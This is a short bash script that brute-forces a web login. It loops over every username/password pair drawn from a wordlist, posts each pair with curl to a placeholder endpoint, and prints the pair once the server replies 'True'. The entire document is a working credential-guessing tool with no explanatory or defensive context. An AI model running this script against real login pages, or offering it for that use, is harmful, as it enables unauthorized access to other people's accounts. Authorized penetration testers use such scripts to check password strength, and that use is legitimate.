#!/bin/bash

# path to your wordlist
mapfile -t lines < /path/to/wordlist.txt

# url or endpoint to test
url="<linkToTest>"

echo "Starting program!"

for user in "${lines[@]}"; do
	
  	for pass in "${lines[@]}"; do
    		http_code=$(curl -L --data-urlencode  username="$user" --data-urlencode password="$pass" "$url" -w '%{http_code}' -o /dev/null -s)
    		http_message=$(curl -s --data-urlencode  username="$user" --data-urlencode password="$pass" "$url")
    		echo "Testing username: '$user' and password: '$pass'"
    		echo $http_message
    		if [[ "$http_message" == "True" ]]; then
      			echo "Success: User: '$user' Pass: '$pass'"
      			break 2
    		fi
  	done
done

